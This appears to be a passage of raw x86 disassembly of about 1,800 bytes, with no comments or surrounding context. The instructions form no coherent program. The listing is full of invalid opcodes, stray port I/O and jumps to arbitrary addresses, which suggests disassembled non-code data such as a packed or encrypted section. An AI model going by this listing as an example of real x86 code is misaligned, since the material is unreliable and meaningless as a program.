  41dc8c:	jb     0x41dc3f
  41dc8e:	cmp    bl,bh
  41dc90:	mov    ah,BYTE PTR [esi+eax*1+0x7217e401]
  41dc97:	add    esi,ebx
  41dc99:	sub    dh,BYTE PTR [edi+0x12861b22]
  41dc9f:	loopne 0x41dc8f
  41dca1:	adc    bh,ch
  41dca3:	rol    BYTE PTR [esi+0x12a79034],0x77
  41dcaa:	xchg   esi,eax
  41dcab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcac:	and    cl,dl
  41dcae:	inc    eax
  41dcaf:	aaa    
  41dcb0:	into   
  41dcb1:	js     0x41dc7e
  41dcb3:	cmp    DWORD PTR [ebx+0x5f150bee],esp
  41dcb9:	nop
  41dcba:	sub    ebx,DWORD PTR [edi-0x59]
  41dcbd:	aas    
  41dcbe:	loop   0x41dc55
  41dcc0:	imul   DWORD PTR [eax+ecx*1]
  41dcc3:	xchg   ebx,eax
  41dcc4:	cld    
  41dcc5:	ret    
  41dcc6:	sub    eax,0xfcd15fe4
  41dccb:	inc    edx
  41dccc:	sub    ah,al
  41dcce:	push   ds
  41dccf:	out    dx,eax
  41dcd0:	addr16 mov edx,0xfd672795
  41dcd6:	std    
  41dcd7:	jbe    0x41dd2a
  41dcd9:	outs   dx,DWORD PTR ds:[esi]
  41dcda:	or     DWORD PTR [eax-0x29af15de],ebp
  41dce0:	xor    DWORD PTR [ecx+0x6d645e77],edx
  41dce6:	mov    bl,0xc1
  41dce8:	js     0x41dd64
  41dcea:	pop    eax
  41dceb:	sub    ecx,ebp
  41dced:	sbb    dl,dl
  41dcef:	(bad)  
  41dcf1:	inc    ebp
  41dcf2:	outs   dx,DWORD PTR ds:[esi]
  41dcf3:	jl     0x41dca7
  41dcf5:	in     al,0xd6
  41dcf7:	int3   
  41dcf8:	push   eax
  41dcf9:	das    
  41dcfa:	xchg   edx,eax
  41dcfb:	xchg   esp,eax
  41dcfc:	jmp    0x7d78e748
  41dd01:	mov    al,ds:0x4b6e6919
  41dd06:	adc    BYTE PTR [ebx-0x41c8824a],ch
  41dd0c:	push   edx
  41dd0d:	xchg   esi,eax
  41dd0e:	pusha  
  41dd0f:	inc    esi
  41dd10:	inc    edx
  41dd11:	or     DWORD PTR [edx+edx*8+0x4a7291b9],eax
  41dd18:	or     dh,BYTE PTR [eax]
  41dd1a:	mov    ds:0x8cc96f86,eax
  41dd1f:	mov    ecx,0x9155e1af
  41dd24:	mov    eax,0xa18fe201
  41dd29:	out    0xbd,al
  41dd2b:	inc    esi
  41dd2c:	aam    0x3a
  41dd2e:	test   eax,0x3344487b
  41dd33:	sbb    dh,BYTE PTR [edx+esi*2-0x4a]
  41dd37:	js     0x41dd15
  41dd39:	sbb    BYTE PTR [edx],ah
  41dd3b:	cdq    
  41dd3c:	jns    0x41dd3e
  41dd3e:	aaa    
  41dd3f:	pop    eax
  41dd40:	pusha  
  41dd41:	mov    ebp,0x90dae6c1
  41dd46:	xchg   esi,eax
  41dd47:	pop    es
  41dd48:	lods   eax,DWORD PTR ds:[esi]
  41dd49:	retf   0xd095
  41dd4c:	or     al,0xae
  41dd4e:	jae    0x41ddc9
  41dd50:	sub    DWORD PTR [ebx],ebp
  41dd52:	cmp    cl,BYTE PTR [edx+0x6c]
  41dd55:	mov    ah,0xa2
  41dd57:	fisubr DWORD PTR [ecx+0x40926c93]
  41dd5d:	xor    esp,DWORD PTR [ebx+eiz*1-0x2c]
  41dd61:	sbb    ecx,DWORD PTR ds:[edi]
  41dd64:	shl    DWORD PTR ds:0xf8fe9853,1
  41dd6a:	jecxz  0x41dcf5
  41dd6c:	add    al,0xfc
  41dd6e:	dec    edi
  41dd6f:	pop    edi
  41dd70:	sbb    BYTE PTR [edi],dh
  41dd72:	cmp    eax,0xe556bc97
  41dd77:	out    0x54,al
  41dd79:	int3   
  41dd7a:	popa   
  41dd7b:	add    al,BYTE PTR [ebx-0x9]
  41dd7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd7f:	ins    BYTE PTR es:[edi],dx
  41dd80:	neg    DWORD PTR [ebx+0x6c532560]
  41dd86:	mov    al,0x69
  41dd88:	sbb    BYTE PTR [edx],0x69
  41dd8b:	mov    al,ds:0xe198eba4
  41dd90:	pop    ebp
  41dd91:	push   edx
  41dd92:	(bad)  
  41dd93:	int3   
  41dd94:	imul   DWORD PTR [edi+0x35]
  41dd97:	or     eax,0xb4cf981d
  41dd9c:	mov    BYTE PTR [edx+0x40],bl
  41dd9f:	and    al,0xbb
  41dda1:	add    eax,esi
  41dda3:	xor    eax,0xe67d425c
  41dda8:	bound  ebp,QWORD PTR [ecx]
  41ddaa:	leave  
  41ddab:	cs pop ebx
  41ddad:	lds    edi,FWORD PTR [ebp+0xcb1c31f]
  41ddb3:	test   eax,edx
  41ddb5:	or     ebp,DWORD PTR [edx+0x63]
  41ddb8:	mov    ecx,0xa4a29e06
  41ddbd:	mov    eax,0xa6518fbc
  41ddc2:	aad    0x79
  41ddc4:	retf   0xe3fb
  41ddc7:	idiv   DWORD PTR [edx]
  41ddc9:	sbb    ah,ah
  41ddcb:	jmp    0xbc16:0x2a80f3f1
  41ddd2:	aaa    
  41ddd3:	outs   dx,BYTE PTR ds:[esi]
  41ddd4:	leave  
  41ddd5:	call   0x6efa4572
  41ddda:	sbb    bl,BYTE PTR [edi+0x75]
  41dddd:	inc    esi
  41ddde:	adc    eax,0xacf9dbde
  41dde3:	mov    ?,WORD PTR [eax-0x14]
  41dde6:	pop    ebx
  41dde7:	or     dl,0xb8
  41ddea:	jg     0x41dd6d
  41ddec:	adc    DWORD PTR [esi+ebx*2],0x92f08f17
  41ddf3:	jne    0x41ddc2
  41ddf5:	jl     0x41ddea
  41ddf7:	div    BYTE PTR [edx+0x63]
  41ddfa:	mov    ebp,0x311afaff
  41ddff:	sahf   
  41de00:	xor    BYTE PTR [ebx],0x36
  41de03:	sbb    ebx,esi
  41de05:	mov    ebp,0xbb1bf3ef
  41de0a:	cwde   
  41de0b:	xchg   al,ch
  41de0d:	mov    cl,0xee
  41de0f:	jo     0x41dde5
  41de11:	inc    esp
  41de12:	pop    es
  41de13:	mov    ds,esp
  41de15:	add    al,0x3b
  41de17:	push   esi
  41de18:	push   esp
  41de19:	cmp    bl,dl
  41de1b:	bound  ecx,QWORD PTR [edi-0x649f6ec9]
  41de21:	sbb    ebp,DWORD PTR [eax+0x52e71387]
  41de27:	add    al,dl
  41de29:	sbb    eax,0x33705b48
  41de2e:	and    eax,ecx
  41de30:	into   
  41de31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de32:	xchg   esp,eax
  41de33:	adc    ebp,esp
  41de35:	sti    
  41de36:	and    DWORD PTR [esi],ebp
  41de38:	popa   
  41de39:	add    bh,dh
  41de3b:	sub    DWORD PTR [eax+0x6d],esp
  41de3e:	jle    0x41dde8
  41de40:	inc    edi
  41de41:	aad    0x18
  41de43:	push   ebp
  41de44:	in     eax,0xb0
  41de46:	rcl    DWORD PTR [ebp+edi*2-0x39],cl
  41de4a:	dec    edi
  41de4b:	in     al,dx
  41de4c:	in     eax,dx
  41de4d:	out    dx,al
  41de4e:	dec    DWORD PTR [eax+0x334c71da]
  41de54:	push   es
  41de55:	inc    edx
  41de56:	out    0x35,al
  41de58:	test   al,ch
  41de5a:	jne    0x41dddd
  41de5c:	js     0x41de48
  41de5e:	and    eax,0x718f6c2a
  41de63:	fmulp  st(1),st
  41de65:	mov    dh,0x7c
  41de67:	mov    al,ds:0x5baf6a85
  41de6c:	rcr    ah,cl
  41de6e:	inc    ebp
  41de6f:	addr16 popf 
  41de71:	sub    BYTE PTR [ecx-0x7de8c318],0xed
  41de78:	pop    edi
  41de79:	inc    ebx
  41de7a:	sub    BYTE PTR [edi],0xa7
  41de7d:	sti    
  41de7e:	aaa    
  41de7f:	jb     0x41de72
  41de81:	adc    DWORD PTR [esi+0x76],esi
  41de84:	mov    fs,WORD PTR [esi]
  41de86:	fld    TBYTE PTR [ebx]
  41de88:	push   ss
  41de89:	imul   BYTE PTR [esp+ebp*8]
  41de8c:	mov    ds:0x5fa6875a,al
  41de91:	fld    st(3)
  41de93:	push   es
  41de94:	and    al,0x15
  41de96:	mov    dl,0xb6
  41de98:	rcr    DWORD PTR [ebx-0x44a76187],cl
  41de9e:	jge    0x41de84
  41dea0:	adc    esi,DWORD PTR [ebx]
  41dea2:	ror    BYTE PTR [ecx],0xce
  41dea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dea6:	xlat   BYTE PTR ds:[ebx]
  41dea7:	stos   DWORD PTR es:[edi],eax
  41dea8:	aaa    
  41dea9:	dec    edi
  41deaa:	sbb    ch,BYTE PTR [ecx-0x1c3ccf5d]
  41deb0:	pop    ebp
  41deb1:	or     ch,BYTE PTR ds:0x3f6b627c
  41deb7:	jge    0x41de44
  41deb9:	inc    esp
  41deba:	pop    edx
  41debb:	(bad)  
  41debd:	call   0x6d266ed2
  41dec2:	mov    ds:0x50db1bfb,al
  41dec7:	and    al,0x38
  41dec9:	retf   0x5dbe
  41decc:	inc    ecx
  41decd:	cmp    al,0x92
  41decf:	adc    eax,0x5c85310c
  41ded4:	dec    esi
  41ded5:	sbb    al,dh
  41ded7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ded8:	bound  edi,QWORD PTR [ebx+0x6d8550e1]
  41dede:	push   ebp
  41dedf:	and    DWORD PTR [ebp+0x384ede4c],ecx
  41dee5:	dec    edi
  41dee6:	mov    esi,DWORD PTR [edx+0x17257c90]
  41deec:	jb     0x41de9c
  41deee:	mov    edx,0x40e4e052
  41def3:	dec    edi
  41def4:	xor    ah,BYTE PTR [edi+edi*4+0x37]
  41def8:	push   0x58
  41defa:	mov    ch,BYTE PTR [edx-0x4c]
  41defd:	ss mov ebx,0xa5375aa7
  41df03:	xor    dh,dl
  41df05:	xchg   ebp,eax
  41df06:	sbb    al,0x97
  41df08:	xchg   esp,eax
  41df09:	or     al,0xa7
  41df0b:	pop    ds
  41df0c:	and    edi,DWORD PTR [esi-0x12]
  41df0f:	aad    0x1e
  41df11:	test   DWORD PTR ds:0x85ac36ab,ebx
  41df17:	adc    BYTE PTR [ebp+0x30],cl
  41df1a:	add    ecx,edx
  41df1c:	add    BYTE PTR [eax],ah
  41df1e:	ret    0x9071
  41df21:	stos   BYTE PTR es:[edi],al
  41df22:	jnp    0x41def0
  41df24:	xor    bh,cl
  41df26:	push   ds
  41df27:	adc    cl,BYTE PTR [ebx-0x25b75540]
  41df2d:	lock fsubrp st(4),st
  41df30:	adc    esp,DWORD PTR [ecx+0x7e1daac2]
  41df36:	imul   ecx,ebp,0x738fa2c9
  41df3c:	mov    es,WORD PTR [ecx-0x53767f49]
  41df42:	in     al,0xf6
  41df44:	pop    eax
  41df45:	pop    edi
  41df46:	dec    eax
  41df47:	mov    eax,0x5de19368
  41df4c:	mov    bl,0xfb
  41df4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df4f:	lods   eax,DWORD PTR ds:[esi]
  41df50:	and    dh,BYTE PTR [ecx+0x12]
  41df53:	push   ss
  41df54:	xor    al,0x46
  41df56:	out    dx,al
  41df57:	xchg   esp,eax
  41df58:	mov    esi,0xb80e634d
  41df5d:	aad    0x42
  41df5f:	stos   DWORD PTR es:[edi],eax
  41df60:	iret   
  41df61:	mov    edx,0x4c4649da
  41df66:	pop    edx
  41df67:	inc    DWORD PTR [esi]
  41df69:	inc    esp
  41df6a:	push   es
  41df6b:	push   edx
  41df6d:	inc    esp
  41df6e:	les    ecx,FWORD PTR [edx+0x58]
  41df71:	adc    ah,BYTE PTR [ebp+ebp*1+0x53a000fa]
  41df78:	outs   dx,DWORD PTR ds:[esi]
  41df79:	ja     0x41dfe6
  41df7b:	rcr    ah,cl
  41df7d:	es push ss
  41df7f:	mov    dh,0x39
  41df81:	(bad)
  41df85:	out    dx,al
  41df86:	mov    BYTE PTR [edi-0x436b905f],dl
  41df8c:	pop    eax
  41df8d:	hlt    
  41df8e:	mov    ebp,0xc14afaf4
  41df93:	(bad)  
  41df94:	cmp    eax,0x8f659adc
  41df99:	les    ebp,FWORD PTR [esi+0x4a]
  41df9c:	retf   
  41df9d:	mov    DWORD PTR [ecx+edi*2],ebx
  41dfa0:	test   al,0x3d
  41dfa2:	push   0x2b
  41dfa4:	fwait
  41dfa5:	stc    
  41dfa6:	(bad)  
  41dfa7:	mov    DWORD PTR [eax+0x41],esp
  41dfaa:	pusha  
  41dfab:	bound  ecx,QWORD PTR [esi-0x1]
  41dfae:	repnz dec BYTE PTR [edx-0x32e4e163]
  41dfb5:	(bad)  [ecx+0x13]
  41dfb8:	xor    ch,BYTE PTR [edx+0x55caa139]
  41dfbe:	out    dx,al
  41dfbf:	mov    BYTE PTR [ebp-0x117cdd5c],ah
  41dfc5:	cmp    al,0x26
  41dfc7:	inc    eax
  41dfc8:	add    BYTE PTR [ebx+eiz*2],bh
  41dfcb:	jb     0x41dfe3
  41dfcd:	ret    0x755f
  41dfd0:	fmul   QWORD PTR [ecx]
  41dfd2:	hlt    
  41dfd3:	dec    eax
  41dfd4:	adc    ebx,DWORD PTR [edi]
  41dfd6:	repnz dec eax
  41dfd8:	adc    ch,bl
  41dfda:	pop    eax
  41dfdb:	or     edx,DWORD PTR [edx-0x16]
  41dfde:	test   al,0x2b
  41dfe0:	xchg   edx,eax
  41dfe1:	out    0x21,al
  41dfe3:	jnp    0x41e01d
  41dfe5:	aam    0xf1
  41dfe7:	leave  
  41dfe8:	fild   DWORD PTR [edi+0x46]
  41dfeb:	rcr    BYTE PTR [ebp+edx*8-0x32],cl
  41dfef:	std    
  41dff0:	xchg   BYTE PTR [ecx-0x26],cl
  41dff3:	call   0x4a2292d8
  41dff8:	pop    edi
  41dff9:	repz loope 0x41df83
  41dffc:	xchg   ecx,eax
  41dffd:	lahf   
  41dffe:	out    0xc6,eax
  41e000:	xor    DWORD PTR [ebp+0x32],ecx
  41e003:	fwait
  41e004:	cld    
  41e005:	sub    cl,cl
  41e007:	inc    ecx
  41e008:	xchg   ebx,eax
  41e009:	out    0x7e,al
  41e00b:	inc    eax
  41e00c:	in     al,dx
  41e00d:	and    BYTE PTR [esi+0x1d48b422],dl
  41e013:	cli    
  41e014:	dec    esi
  41e015:	mov    al,0x9b
  41e017:	ror    edx,0x4f
  41e01a:	xor    eax,0x498e0854
  41e01f:	pop    ds
  41e020:	cmp    esi,ebp
  41e022:	mov    bh,0x32
  41e024:	sbb    BYTE PTR [esi-0x38f22aa4],dh
  41e02a:	sub    DWORD PTR [edi-0x7f],ecx
  41e02d:	lods   eax,DWORD PTR ds:[esi]
  41e02e:	es in  al,dx
  41e030:	jp     0x41e00f
  41e032:	ins    BYTE PTR es:[edi],dx
  41e033:	and    DWORD PTR [ebx+0x7],edx
  41e036:	jbe    0x41dfd2
  41e038:	inc    ebx
  41e039:	in     eax,0xf7
  41e03b:	test   esi,ebx
  41e03d:	push   edi
  41e03e:	mov    ebx,0xc95554df
  41e043:	aaa    
  41e044:	popa   
  41e045:	add    eax,0x11e1a2b9
  41e04a:	inc    edx
  41e04b:	sahf   
  41e04c:	pusha  
  41e04d:	not    esp
  41e04f:	inc    edx
  41e050:	fimul  WORD PTR [eax]
  41e052:	xor    eax,0x6ad97818
  41e057:	mov    ebp,fs
  41e059:	leave  
  41e05a:	fimul  DWORD PTR ds:0x2ea4b0e9
  41e060:	in     al,0x61
  41e062:	stos   DWORD PTR es:[edi],eax
  41e063:	or     cl,dh
  41e065:	ja     0x41e032
  41e067:	in     eax,dx
  41e068:	test   eax,0x64a02f52
  41e06d:	(bad)  
  41e06e:	sbb    BYTE PTR cs:[eax+ebp*2+0x1fa90290],ah
  41e076:	push   ebp
  41e077:	ficomp WORD PTR [esi-0x6c]
  41e07a:	(bad)  [edx-0x7e]
  41e07d:	add    eax,0x24315d0c
  41e082:	cvtps2pi mm2,QWORD PTR [ebp-0x59]
  41e086:	adc    BYTE PTR [edi],dh
  41e088:	xchg   dh,dh
  41e08a:	icebp  
  41e08b:	das    
  41e08c:	daa    
  41e08d:	mov    edi,edi
  41e08f:	xchg   ecx,eax
  41e090:	(bad)  
  41e092:	mov    al,0xe9
  41e094:	add    BYTE PTR [esi-0x2e],cl
  41e097:	pop    ebx
  41e098:	fst    DWORD PTR [edx+0x79]
  41e09b:	movntq QWORD PTR [eax+0x35981c7f],mm1
  41e0a2:	(bad)  
  41e0a3:	jg     0x41e03e
  41e0a5:	jg     0x41e062
  41e0a7:	jnp    0x41e11f
  41e0a9:	or     BYTE PTR [esi],al
  41e0ab:	fdiv   DWORD PTR [bp+di]
  41e0ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e0af:	bound  eax,QWORD PTR [esi-0xd]
  41e0b2:	or     al,0x53
  41e0b5:	jo     0x41e06a
  41e0b7:	xor    DWORD PTR [ecx-0x44],eax
  41e0ba:	and    BYTE PTR [ecx+0x10aa4b4c],0xfe
  41e0c1:	ret    
  41e0c2:	jle    0x41e0fc
  41e0c4:	and    al,0x64
  41e0c6:	or     eax,0xe0de3a59
  41e0cb:	sub    BYTE PTR [edi-0x780d04c9],0x48
  41e0d2:	jg     0x41e144
  41e0d4:	jp     0x41e079
  41e0d6:	jo     0x41e0b4
  41e0d8:	push   esi
  41e0d9:	ret    
  41e0da:	(bad)  
  41e0db:	dec    ecx
  41e0dc:	imul   edi,DWORD PTR [edi+0x5d],0x79
  41e0e0:	pop    ss
  41e0e1:	or     ebp,DWORD PTR [esi]
  41e0e3:	jge    0x41e107
  41e0e5:	add    eax,0xaa1e15cb
  41e0ea:	aaa    
  41e0eb:	mov    dl,0xf2
  41e0ed:	mov    eax,ebp
  41e0ef:	icebp  
  41e0f0:	mov    al,0x8
  41e0f2:	enter  0x9257,0xc
  41e0f6:	push   esi
  41e0f7:	hlt    
  41e0f8:	xchg   edx,eax
  41e0f9:	adc    DWORD PTR [ebx+edi*8+0x450dea68],0xffffffc5
  41e101:	pop    esp
  41e102:	fs das 
  41e104:	mov    WORD PTR [ebx+0x62],ds
  41e107:	jb     0x41e164
  41e109:	mov    BYTE PTR [edi+ecx*8+0x4a],bl
  41e10d:	xchg   edx,eax
  41e10e:	mov    BYTE PTR [ebx+0x2910b9d1],bh
  41e114:	mov    BYTE PTR [esi+0x3118dbcd],dh
  41e11a:	cmp    al,0x27
  41e11c:	sbb    al,0x8e
  41e11e:	inc    ebx
  41e11f:	xor    DWORD PTR [ebx+edx*8+0x74],edi
  41e123:	mov    bh,0x2a
  41e125:	sbb    al,0x3f
  41e127:	stos   BYTE PTR es:[edi],al
  41e128:	outs   dx,DWORD PTR ds:[esi]
  41e129:	and    al,0x8a
  41e12b:	sti    
  41e12c:	gs call 0x401c:0x11b652f8
  41e134:	mov    ch,0x95
  41e136:	es pop es
  41e138:	xchg   BYTE PTR ds:0x7affed84,al
  41e13e:	rcr    BYTE PTR [ecx],1
  41e140:	ja     0x41e142
  41e142:	inc    ebx
  41e143:	idiv   BYTE PTR [ebx+0xb]
  41e146:	mov    al,ds:0xc9be0460
  41e14b:	xor    edx,DWORD PTR [eax-0x62]
  41e14e:	icebp  
  41e14f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e150:	in     al,0x32
  41e152:	ret    0xfa9c
  41e155:	push   cs
  41e156:	pop    edx
  41e157:	mov    al,ch
  41e159:	(bad)  
  41e15a:	scas   eax,DWORD PTR es:[edi]
  41e15b:	ds pop ds
  41e15d:	cwde   
  41e15e:	or     eax,0x70b75c2b
  41e163:	(bad)  
  41e164:	sub    edx,DWORD PTR [ecx]
  41e166:	dec    ecx
  41e167:	retf   0x7419
  41e16a:	add    ebx,DWORD PTR [ebx]
  41e16c:	mov    edi,0xbb551739
  41e171:	mov    ebx,0xc8b9493f
  41e176:	loope  0x41e1de
  41e178:	and    eax,0x3fe6cc93
  41e17d:	push   eax
  41e17e:	lods   al,BYTE PTR ds:[esi]
  41e17f:	test   DWORD PTR [ecx+esi*4-0x6d36c239],esp
  41e186:	fs mov al,0x3f
  41e189:	mov    bh,0x38
  41e18b:	imul   esi,DWORD PTR [ecx+0x75],0x54
  41e18f:	out    0x81,al
  41e191:	xchg   esp,eax
  41e192:	pop    esi
  41e193:	rcr    DWORD PTR [esi],1
  41e195:	sbb    eax,0xde881753
  41e19a:	mov    ah,0xbe
  41e19c:	jnp    0x41e1a8
  41e19e:	movq   mm7,mm1
  41e1a1:	imul   eax,edi,0x3c37637
  41e1a7:	stos   BYTE PTR es:[edi],al
  41e1a8:	push   edx
  41e1a9:	aaa    
  41e1aa:	fs inc edx
  41e1ac:	ficomp DWORD PTR [esi-0x388d6ea3]
  41e1b2:	inc    ebp
  41e1b3:	dec    ebp
  41e1b4:	bts    eax,esp
  41e1b7:	pushf  
  41e1b8:	pop    esi
  41e1b9:	stc    
  41e1ba:	stos   BYTE PTR es:[edi],al
  41e1bb:	inc    ecx
  41e1bc:	sti    
  41e1bd:	call   0xc7f4:0xd18a86f7
  41e1c4:	imul   ecx,edx,0xee95803d
  41e1ca:	push   ebx
  41e1cb:	jne    0x41e219
  41e1cd:	retf   0x6bb0
  41e1d0:	rcl    DWORD PTR [esi-0x27b39385],cl
  41e1d6:	or     eax,0x81804127
  41e1db:	mov    ecx,0xb644a379
  41e1e0:	clc    
  41e1e1:	mov    bl,0xb1
  41e1e3:	out    dx,eax
  41e1e4:	dec    ecx
  41e1e5:	fistp  DWORD PTR [eax+0x2c]
  41e1e8:	aaa    
  41e1e9:	iret   
  41e1ea:	and    eax,DWORD PTR [eax+0x3e]
  41e1ed:	dec    esi
  41e1ee:	inc    ecx
  41e1ef:	mov    bl,0xa2
  41e1f1:	push   eax
  41e1f2:	repnz outs dx,BYTE PTR ds:[esi]
  41e1f4:	mov    eax,0x8772761b
  41e1f9:	std    
  41e1fa:	jae    0x41e1d2
  41e1fc:	inc    esp
  41e1fd:	push   esi
  41e1fe:	dec    eax
  41e1ff:	xor    DWORD PTR [ebx],esp
  41e201:	sbb    eax,eax
  41e203:	(bad)  
  41e205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e206:	js     0x41e236
  41e208:	dec    ebx
  41e209:	push   esi
  41e20a:	mov    dl,0x42
  41e20c:	xor    BYTE PTR [esi+0x2c],dl
  41e20f:	bound  edx,QWORD PTR [ebx+ebx*1+0x332511aa]
  41e216:	in     al,0x91
  41e218:	imul   DWORD PTR [ebx-0x4f]
  41e21b:	psrad  mm5,QWORD PTR ds:0xab6b6002
  41e222:	dec    eax
  41e223:	fld    DWORD PTR [ecx+0x7aa0bf9d]
  41e229:	jb     0x41e1b7
  41e22b:	aad    0x3f
  41e22d:	sub    BYTE PTR [eax-0xc716a0e],al
  41e233:	cwde   
  41e234:	pop    ebp
  41e235:	mov    WORD PTR [edx],cs
  41e237:	mov    ch,0x40
  41e239:	add    eax,0xa50ca3a1
  41e23e:	je     0x41e22a
  41e240:	repz clc 
  41e242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e243:	mov    ds:0x15ef8a1a,al
  41e248:	or     al,0xe3
  41e24a:	cmp    BYTE PTR [ecx-0x23ef31bc],al
  41e250:	cmc    
  41e251:	js     0x41e1e2
  41e253:	pushf  
  41e254:	gs dec esi
  41e256:	ins    BYTE PTR es:[edi],dx
  41e257:	outs   dx,BYTE PTR ds:[esi]
  41e258:	dec    ebx
  41e259:	aad    0xd2
  41e25b:	push   es
  41e25c:	int3   
  41e25d:	add    bh,BYTE PTR [ebx-0x50]
  41e260:	ja     0x41e209
  41e262:	fnstcw WORD PTR [ecx-0x55f8f0c3]
  41e268:	xlat   BYTE PTR ds:[ebx]
  41e269:	data16 test BYTE PTR [ebx+0x10b2212],ch
  41e270:	jne    0x41e292
  41e272:	and    ah,BYTE PTR [esi-0x73]
  41e275:	xchg   edx,eax
  41e276:	std    
  41e277:	div    BYTE PTR [edi]
  41e279:	je     0x41e2c3
  41e27b:	(bad)  
  41e27c:	pop    ebp
  41e27d:	pop    ecx
  41e27e:	cdq    
  41e27f:	inc    ebp
  41e280:	push   ds
  41e281:	arpl   sp,sp
  41e283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e284:	icebp  
  41e285:	cmp    BYTE PTR [eax+0x1a8cdcfc],cl
  41e28b:	in     eax,dx
  41e28c:	lahf   
  41e28d:	push   ecx
  41e28e:	sbb    al,0x54
  41e290:	adc    ebx,edi
  41e292:	and    BYTE PTR [ecx-0x27],0xff
  41e296:	ss or  al,0xb1
  41e299:	fwait
  41e29a:	leave  
  41e29b:	not    al
  41e29d:	sub    BYTE PTR ds:0xca58f82b,ch
  41e2a3:	sbb    al,0xf3
  41e2a5:	pop    es
  41e2a6:	fnstenv [eax]
  41e2a8:	sub    BYTE PTR [edi],dh
  41e2aa:	mov    eax,ds:0x81971e40
  41e2af:	lock mov dh,0x6e
  41e2b2:	mov    ds:0xe630fdc3,al
  41e2b7:	dec    eax
  41e2b8:	jo     0x41e295
  41e2ba:	mov    ebp,0xa85019ab
  41e2bf:	push   ebx
  41e2c0:	pusha  
  41e2c1:	cmp    BYTE PTR [ebx+0x21],dh
  41e2c4:	xor    al,0xdf
  41e2c6:	and    DWORD PTR ds:0xbfe7ed71,edx
  41e2cc:	retf   
  41e2cd:	push   eax
  41e2ce:	sbb    cl,BYTE PTR [ecx]
  41e2d0:	inc    edx
  41e2d1:	aaa    
  41e2d2:	das    
  41e2d3:	(bad)  
  41e2d4:	and    al,0x90
  41e2d6:	cmp    DWORD PTR [eax],esp
  41e2d8:	in     eax,dx
  41e2d9:	jae    0x41e2db
  41e2db:	pop    ss
  41e2dc:	jecxz  0x41e27e
  41e2de:	out    dx,al
  41e2df:	ss xchg edi,eax
  41e2e1:	retf   
  41e2e2:	enter  0xbfb8,0xcf
  41e2e6:	mov    cl,0xe3
  41e2e8:	and    ah,BYTE PTR gs:[esi]
  41e2eb:	jmp    0xd74b6dba
  41e2f0:	adc    ah,BYTE PTR [esp+eax*4-0x6b]
  41e2f4:	jp     0x41e324
  41e2f6:	mov    ch,BYTE PTR [eax-0x28dd2f8e]
  41e2fc:	sbb    al,BYTE PTR [esi-0x34]
  41e2ff:	dec    ebx
  41e300:	(bad)  
  41e301:	cmc    
  41e302:	popa   
  41e303:	xchg   edi,eax
  41e304:	mov    ds,WORD PTR [ecx-0x53ca2533]
  41e30a:	inc    edx
  41e30b:	fmul   QWORD PTR [ebx]
  41e30d:	arpl   WORD PTR [edx+0x3ae5da34],dx
  41e313:	lahf   
  41e314:	jle    0x41e375
  41e316:	mov    esi,0xceb1933c
  41e31b:	push   ds
  41e31c:	mov    al,ds:0x29daa419
  41e321:	mov    edx,0xb7cbcb4d
  41e326:	push   ds
  41e327:	test   al,0x2e
  41e329:	stos   DWORD PTR es:[edi],eax
  41e32a:	cmp    eax,0xfa367e2a
  41e32f:	jl     0x41e33d
  41e331:	and    BYTE PTR [eax],ah
  41e333:	loope  0x41e38c
  41e335:	mov    cl,0x3e
  41e337:	mov    dl,0x6a
  41e339:	xchg   edi,eax
  41e33a:	leave  
  41e33b:	hlt    
  41e33c:	xor    al,BYTE PTR [ebx]
  41e33e:	push   esi
  41e33f:	rcr    BYTE PTR ds:0xa4a15d3e,0xeb
  41e346:	in     eax,0x9d
  41e348:	div    eax
  41e34a:	vaddps xmm1,xmm7,XMMWORD PTR [esi+0x69]
  41e34f:	popf   
  41e350:	adc    ch,BYTE PTR [ecx]
  41e352:	sbb    eax,0xbc119774
  41e357:	xor    DWORD PTR [edx],edx
  41e359:	idiv   bh
  41e35b:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e35d:	jecxz  0x41e2ed
  41e35f:	pop    eax
  41e360:	and    DWORD PTR [ecx+0x14],edx
  41e363:	push   es
  41e364:	and    edx,ecx
  41e366:	das    
  41e367:	int    0x92
  41e369:	inc    ebx
  41e36a:	and    al,0xc0
  41e36c:	and    DWORD PTR ds:0x38172d81,ebx
  41e372:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e373:	jmp    FWORD PTR [edx-0x6d8cd3f9]
  41e379:	addr16 cs pop edi
  41e37c:	retf   0x676c
  41e37f:	or     DWORD PTR [ebp+0x1b8d3439],ecx
  41e385:	sub    BYTE PTR [ebx],bh
  41e387:	loope  0x41e30f
  41e389:	sub    BYTE PTR [eax],0xfb
  41e38c:	inc    edi
  41e38d:	aam    0x31
  41e38f:	lods   eax,DWORD PTR ds:[esi]
  41e390:	jbe    0x41e3c4
  41e392:	xlat   BYTE PTR ds:[ebx]
  41e393:	shl    BYTE PTR [edi+ebp*8+0xe],cl
  41e397:	jge    0x41e393
  41e399:	stc    
  41e39a:	and    DWORD PTR [edx+eiz*1],0x10289ba5
  41e3a1:	mov    cl,0x87
  41e3a3:	mov    al,0xa3
  41e3a5:	sbb    esp,DWORD PTR [bp+si+0x5938]
  41e3aa:	(bad)  
  41e3ab:	jecxz  0x41e386
  41e3ad:	or     ch,BYTE PTR [esp+eax*8]
  41e3b0:	sahf   
  41e3b1:	sbb    ah,BYTE PTR [eax-0x21]
  41e3b4:	adc    BYTE PTR [eax+ebp*4+0x6f3299e6],bl
  41e3bb:	cmp    eax,DWORD PTR [ebp+0x7bc329fd]
  41e3c1:	fisubr DWORD PTR [esi]
  41e3c3:	ins    BYTE PTR es:[edi],dx
  41e3c4:	test   BYTE PTR [ecx],ch
  41e3c6:	xor    al,BYTE PTR [edi]
  41e3c8:	sbb    BYTE PTR [ebx-0x7db5c3ba],al
  41e3ce:	jmp    0x41e3b4
  41e3d0:	leave  
  41e3d1:	cwde   
  41e3d2:	add    al,0x91
